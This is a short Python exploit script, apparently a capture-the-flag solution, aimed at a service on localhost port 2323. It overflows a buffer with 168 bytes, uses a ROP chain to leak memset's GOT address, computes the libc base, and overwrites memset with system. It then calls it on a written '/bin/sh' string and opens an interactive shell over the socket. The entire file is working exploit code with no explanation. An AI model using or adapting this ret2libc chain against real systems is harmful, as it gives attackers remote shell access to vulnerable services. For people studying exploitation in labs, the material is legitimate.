#!/usr/bin/env python

import telnetlib
from socket import *
from struct import *

read_plt   = 0x400590            # address of read
memset_plt = 0x400580            # address of memset
writeable  = 0x601000            # location to write "/bin/sh"
memset_off = 0x082a30            # memset offset in libc
system_off = 0x03f420            # system offset in libc
write_plt  = 0x400550            # address of write
memset_got = 0x601030            # memset GOT
pop3ret    = 0x4006ba            # gadget

buf = ""
buf += "A"*168
buf += pack("<Q", pop3ret)
buf += pack("<Q", 0x1)           # stdout
buf += pack("<Q", memset_got)
buf += pack("<Q", 0x8)
buf += pack("<Q", write_plt)

buf += pack("<Q", pop3ret)
buf += pack("<Q", 0x0)
buf += pack("<Q", memset_got)
buf += pack("<Q", 0x8)
buf += pack("<Q", read_plt)

buf += pack("<Q", pop3ret)
buf += pack("<Q", 0x0)
buf += pack("<Q", writeable)
buf += pack("<Q", 0x8)
buf += pack("<Q", read_plt)

buf += pack("<Q", pop3ret)
buf += pack("<Q", writeable)
buf += pack("<Q", 0x0)
buf += pack("<Q", 0x0)
buf += pack("<Q", memset_plt)

s = socket(AF_INET, SOCK_STREAM)
s.connect(("127.0.0.1", 2323))

s.send(buf + "\n")
d = s.recv(1024)[-8:]

memset_addr = unpack("<Q", d)
libc_base = memset_addr[0] - memset_off
system_addr = libc_base + system_off
s.send(pack("<Q", system_addr))
s.send("/bin/sh")

t = telnetlib.Telnet()
t.sock = s
t.interact()

